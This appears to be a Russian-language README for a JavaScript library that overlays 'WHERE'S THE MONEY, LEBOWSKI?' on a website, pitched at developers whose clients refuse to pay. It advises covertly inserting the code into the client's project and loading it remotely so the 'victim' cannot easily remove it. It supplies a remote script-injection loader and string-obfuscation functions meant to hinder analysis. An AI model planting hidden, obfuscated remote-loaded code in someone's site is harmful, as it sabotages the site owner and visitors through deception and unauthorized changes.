# WhereMyMoneyLebovski

Заказчик не хочет платить за кучу его правок, или вовсе решил кинуть на проект?)

Простая библиотека js, которая генерирует блок с текстом "ГДЕ ДЕНЬГИ, ЛЕБОВСКИ?" и отображает поверх сайта.

Подключение модуля:

```
<script src="/path-to-script/wml.js"></script> 

(function() {
	WMLModule.init({"show":true});
})();

```

Параметр `show` отвечает за показ текста на экране. 

Можно добавить этот кусочек в исполняемый js файл вашего проекта, а так же подгрузить `wml.js` удаленно, чтобы жертва не сразу смогла его отключить

Код функции, которой можно выполнить загрузку и внедрение скрипта в шаблон, после чего проинициализировать
```
function dynamicallyLoadScript(url) {
    var script = document.createElement("script");
    script.src = url;
    document.head.appendChild(script);
}

dynamicallyLoadScript('https://site.com/wml.js')

(function() {
  WMLModule.init({"show":true});
})();

```

В качестве примера выкладываю и закодированную версию `wml.min.js`, в которой строки генерируются в Uint8Array (чтобы дураку сложнее было разобраться, разумеется)

Функции, которыми кодировал строки

```
//Закодировать текст в символы
function stu(_sT) {
	let _ss = btoa(unescape(encodeURIComponent(_sT))),
		_chL = _ss.split(''),
		_uA = [];
	for (let i = 0; i < _chL.length; i++) {
		_uA.push(_chL[i].charCodeAt(0));
	}
	return new Uint8Array(_uA);
}

//Раскодировать символы в текст
function uts(_uA) {
	let _eS = String.fromCharCode.apply(null, _uA),
		_dS = decodeURIComponent(escape(atob(_eS)));
	return _dS;
}


// Пример: 
stu('Привет!') --> [48, 74, 47, 82, 103, 78, 67, 52, 48, 76, 76, 81, 116, 100, 71, 67, 73, 81, 61, 61]

uts([48, 74, 47, 82, 103, 78, 67, 52, 48, 76, 76, 81, 116, 100, 71, 67, 73, 81, 61, 61]) --> Привет!

```

![This is an image](https://lux-tv.ru/public/wml.gif)
